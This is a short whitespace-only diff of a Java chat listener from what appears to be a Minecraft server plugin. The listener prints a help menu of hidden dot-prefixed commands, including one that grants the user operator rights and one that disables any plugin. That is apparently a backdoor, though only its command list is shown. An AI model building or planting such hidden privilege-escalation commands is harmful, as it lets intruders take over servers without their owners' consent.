@@ -16,7 +16,7 @@ public class Command_help implements Listener
     
         if (message.toLowerCase().contains(".help"))
         {
-			p.sendMessage(ChatColor.RED + "Warning: You have to start the commands with . not /");
+            p.sendMessage(ChatColor.RED + "Warning: You have to start the commands with . not /");
             p.sendMessage(ChatColor.AQUA + "Commands");
             p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
             p.sendMessage(ChatColor.GOLD + ".disableplugin - Disables a plugin of your choice.");
